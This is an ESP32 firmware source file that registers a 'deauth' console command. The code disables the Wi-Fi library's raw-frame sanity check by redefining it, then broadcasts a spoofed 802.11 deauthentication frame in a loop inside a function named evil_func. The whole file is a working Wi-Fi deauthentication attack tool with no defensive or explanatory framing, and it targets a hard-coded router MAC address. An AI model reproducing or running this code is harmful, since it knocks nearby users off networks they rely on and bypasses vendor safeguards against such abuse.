#include "app.h"

static const char *TAG = __FILE__;


static struct {
    struct arg_lit *test;
    struct arg_end *end;
} _deauth_args;


typedef struct _deauth_runtime_struct {
    bool is_running;
    //// task 
    TaskHandle_t task;
    SemaphoreHandle_t sem_task_over;

    _deauth_runtime_struct()
    {
        is_running=false;
    }
} deauth_runtime_t;

static deauth_runtime_t _deauth_rt;


// Add linker flags (component.mk and/or CMakeLists and/or Makefile)
// COMPONENT_ADD_LDFLAGS += -z muldefs
// Redefine ieee80211_raw_frame_sanity_check somewhere
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  ESP_LOGD(TAG,"Intercepted ieee80211_raw_frame_sanity_check");
  return 0;
}

/*extern "C" int ieee80211_rrr_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  ESP_LOGD(TAG,"Intercepted ieee80211_rrr_frame_sanity_check");
  return 0;
}*/

static uint8_t deauth_frame[] = {
    0xc0, 0x00,                             // Frame control (deauth code: 12)
    0x00, 0x00,                             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,     // Destination (broadcast)
    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // Transmitter/Source (router)
    0xe8, 0x94, 0xf6, 0xb5, 0x84, 0xdc,     // BSSID
    0x00, 0x00,                             // Fragment and Sequence number
    0x07, 0x00                              // Reason code: Class 3 frame received from nonassociated STA
};


// static void start_wifi_as_softap(void)
// {
//     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
//     cfg.nvs_enable = false;

//     wifi_config_t w_config = {
//         .ap.ssid = DEFAULT_SSID,
//         .ap.password = DEFAULT_PWD,
//         .ap.ssid_len = 0,
//         .ap.channel = 1,
//         .ap.authmode = WIFI_AUTH_WPA2_PSK,
//         .ap.ssid_hidden = false,
//         .ap.max_connection = 4,
//         .ap.beacon_interval = 100,
//     };

//     event_init();

//     // can't deinit event loop, need to reset leak check
//     unity_reset_leak_checks();

//     if (wifi_events == NULL) {
//         wifi_events = xEventGroupCreate();
//     }

//     TEST_ESP_OK(esp_wifi_init(&cfg));
//     TEST_ESP_OK(esp_wifi_set_mode(WIFI_MODE_AP));
//     TEST_ESP_OK(esp_wifi_set_config(WIFI_IF_AP, &w_config));
//     TEST_ESP_OK(esp_wifi_start());
// }


///////////////////////////////////////////////////////////////////////////////////
//
//
void evil_func() {
    for (int k = 0; k < 100; k++) 
    {
        esp_err_t __err_rc = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (__err_rc != ESP_OK) {
            ESP_LOGE(TAG,"Raw frames not supported!!!");
            break;
        }       
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }
}


///////////////////////////////////////////////////////////////////////////////////
//
//
static esp_err_t death_test(deauth_runtime_t *pmon)
{
    wifi_config_t ap_config;
    strcpy((char*)ap_config.ap.ssid, "esp32-beaconspam");
    ap_config.ap.ssid_len = 0;
    strcpy((char*)ap_config.ap.password, "dummypassword");
    ap_config.ap.channel = WiFi.get_channel();
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 1;
    ap_config.ap.max_connection = 4;
    if (strlen((char*)ap_config.ap.password) == 0) {
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "wifi_init_softap finished. SSID:%s password:%s",
             ap_config.ap.ssid, 
             ap_config.ap.password);

    evil_func();
    return ESP_OK;
}


///////////////////////////////////////////////////////////////////////////////////
//
//
static int do_deauth_cmd(int argc, char **argv)
{
    ESP_LOGD(__FUNCTION__, "Enter...");
    int nerrors = arg_parse(argc, argv, (void **)&_deauth_args);
    if (nerrors != 0) {
        arg_print_errors(stderr, _deauth_args.end, argv[0]);
        return 0;
    }
    //bool bChangeOnTheFly = _deauth_rt.is_running;
    // --test
    if (_deauth_args.test->count) {
        death_test(&_deauth_rt);
        return 0;
    }
    ESP_LOGD(__FUNCTION__, "Left.");
    return 0;
}

///////////////////////////////////////////////////////////////////////////////////
//
//
void register_cmd_deauth(void)
{
    ESP_LOGD(__FUNCTION__, "Starting...");
    _deauth_args.test = arg_lit0("t", "test", "test evil function");
    _deauth_args.end = arg_end(1);
    const esp_console_cmd_t deauth_cmd = {
        .command = "deauth",
        .help = "Deauther",
        .hint = NULL,
        .func = &do_deauth_cmd,
        .argtable = &_deauth_args
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));
    ESP_LOGD(__FUNCTION__, "Started.");
}